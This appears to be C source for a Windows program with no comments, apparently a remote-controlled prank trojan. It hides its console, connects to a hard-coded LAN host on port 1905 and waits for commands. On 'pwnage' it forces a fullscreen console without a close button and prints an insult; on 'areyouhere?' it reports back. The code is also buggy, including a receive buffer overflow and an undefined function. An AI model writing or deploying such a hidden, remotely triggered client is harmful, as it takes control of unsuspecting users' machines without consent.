#include <stdio.h>
#include <conio.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#define PORT 1905
#define MSG_WAITALL 0x8 
#pragma comment(lib, "ws2_32.lib") //Winsock Library

int main(int argc, char *argv[]){
    signal(SIGINT, NULL);
    FreeConsole();
    int valread = 0;
    WSADATA wsa;
    int buf_idx = 0;
    SOCKET s;
    struct sockaddr_in server;
    char c = 0;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0){
        c = getch();
        return 1;
    }
    if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET){
        WSACleanup();
        c = getch();
        return 1;
    }
    memset(&server, 0, sizeof server);
    server.sin_addr.s_addr = inet_addr("192.168.1.160");
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    if (connect(s, (struct saddr *)&server, sizeof(server)) < 0){
        closesocket(s);
        WSACleanup();
        c = getch();
        return 1;
    }
    char buffer[99999] = {0};
    recv(s, buffer, 999999, 0);
    send(s, "unencrypted", strlen("unencrypted"), 0);
    AllocConsole();
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL){
      HMENU hMenu = GetSystemMenu(hwnd, FALSE);
      if (hMenu != NULL) DeleteMenu(hMenu, SC_CLOSE, MF_BYCOMMAND);
    }
    FILE *fDummy;
    freopen_s(&fDummy, "CONIN$", "r", stdin);
    freopen_s(&fDummy, "CONOUT$", "w", stderr);
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    int i=1;
    while (1) {
      i++;
      printf("Trip Counter: %d \n", i);
      char buffer[99999] = {0};
      recv(s, buffer, 999999, MSG_WAITALL);
      printf("Buffer: %s\n", buffer);
      strtok(buffer, "\n");
      strtok(buffer, "\r");
      if (!strcmp(buffer,"pwnage")) {
        AllocConsole();
        signal(SIGINT, NULL);
        keybd_event(VK_MENU,0x38,0,0);
	      keybd_event(VK_RETURN,0x1c,0,0);
	      keybd_event(VK_RETURN,0x1c,KEYEVENTF_KEYUP,0);
	      keybd_event(VK_MENU,0x38,KEYEVENTF_KEYUP,0);
        HWND hwnd = GetConsoleWindow();
        if (hwnd != NULL){
          HMENU hMenu = GetSystemMenu(hwnd, FALSE);
          if (hMenu != NULL) DeleteMenu(hMenu, SC_CLOSE, MF_BYCOMMAND);
        }
        FILE *fDummy;
        freopen_s(&fDummy, "CONIN$", "r", stdin);
        freopen_s(&fDummy, "CONOUT$", "w", stderr);
        freopen_s(&fDummy, "CONOUT$", "w", stdout);
        initAni();
        printf("Dipshit");
      } else if (!strcmp(buffer,"areyouhere?")) {
        send(s, "yes", strlen("yes"), 0);
      }
    }
    closesocket(s);
    WSACleanup();
    c = getch();
    return 0;
}